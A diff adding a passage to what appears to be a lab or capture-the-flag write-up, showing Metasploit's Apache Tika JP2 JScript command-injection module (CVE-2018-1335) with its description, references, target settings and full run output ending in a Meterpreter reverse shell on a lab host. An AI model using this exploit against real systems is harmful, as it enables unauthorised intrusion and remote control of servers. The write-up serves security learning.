@@ -75,3 +75,63 @@ I did a google search for Tika 1.17 exploit, and checked out this Header Command
 I'm going to open up msfconsole and search for this exploit.
 
 ![msf1](https://github.com/user-attachments/assets/3f8fb7e6-7f58-43c6-9ae9-c336b6031038)
+
+Payload information:
+
+Description:
+  This module exploits a command injection vulnerability in Apache 
+  Tika 1.15 - 1.17 on Windows. A file with the image/jp2 content-type 
+  is used to bypass magic bytes checking. When OCR is specified in the 
+  request, parameters can be passed to change the parameters passed at 
+  command line to allow for arbitrary JScript to execute. A JScript 
+  stub is passed to execute arbitrary code. This module was verified 
+  against version 1.15 - 1.17 on Windows 2012. While the CVE and 
+  finding show more versions vulnerable, during testing it was 
+  determined only > 1.14 was exploitable due to jp2 support being 
+  added.
+
+References:
+  https://www.exploit-db.com/exploits/46540
+  https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/
+  https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E
+  https://nvd.nist.gov/vuln/detail/CVE-2018-1335
+
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rhosts 10.10.179.83
+rhosts => 10.10.179.83
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rport 61777
+rport => 61777
+msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit
+
+[*] Started reverse TCP handler on 10.10.177.69:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -   8.10% done (7999/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  16.19% done (15998/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  24.29% done (23997/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  32.39% done (31996/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  40.48% done (39995/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  48.58% done (47994/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  56.67% done (55993/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  64.77% done (63992/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  72.87% done (71991/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  80.96% done (79990/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  89.06% done (87989/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Command Stager progress -  97.16% done (95988/98798 bytes)
+[*] Sending PUT request to 10.10.179.83:61777/meta
+[*] Sending stage (175686 bytes) to 10.10.179.83
+[*] Command Stager progress - 100.00% done (98798/98798 bytes)
+[*] Meterpreter session 1 opened (10.10.177.69:4444 -> 10.10.179.83:49859) at 2024-08-04 20:33:28 +0000
+
+meterpreter > 
